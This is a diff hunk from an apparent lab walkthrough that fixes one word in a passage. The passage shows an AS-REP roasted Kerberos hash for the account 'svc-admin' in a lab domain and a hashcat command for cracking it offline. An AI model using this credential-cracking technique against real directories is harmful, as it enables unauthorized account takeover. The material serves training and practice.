@@ -164,7 +164,7 @@ Impacket v0.9.24.dev1+20210814.5640.358fc7c6 - Copyright 2021 SecureAuth Corpora
 $krb5asrep$23$svc-admin@SPOOKYSEC.LOCAL:fea34e6cdca777efe84cbdeaa48d35b9$cf364f98148fce49cc67dd350754a9c9ccf20dd516b1c2c6aecb6984aba91fca5b386b4ba7b59434f54440ecccdd549533157318a55752abe941976eae78132f61832fba98bc391ee52c51e924cd8d091b6e6d854bc16e769184867024f195936687839c4e63cf54f7a2e1749020c279e3b08f78826ca90deffcda9bdd721a87166fa6e9fe6f68cd493751df05b2ae92a0e5e466f8c674bf16c346e9ee9714f7098369d90dad8e5bac5b4ac316e94ff65acd8914a356450be18b671db831031c6a709369d586d704bc827f2221f3edfd60e5f675fb6ac97570e20bd094362e354b63279e757486c82162d6ae04467d7c1261
 ```
 
-We recieved a Kerberos Ticket (Kerberos 5 AS-REP etype 23, mode 18200) which we can crack using hashcat and the provided passwordlist: ```hashcat -a 0 -m 18200 ~/example.hash ~/passwordlist.txt```
+We recieved a Kerberos Ticket (Kerberos 5 AS-REP etype 23, mode 18200) which we can crack using hashcat and the provided password list: ```hashcat -a 0 -m 18200 ~/example.hash ~/passwordlist.txt```
 
 ``` txt
 hashcat (v6.1.1) starting...
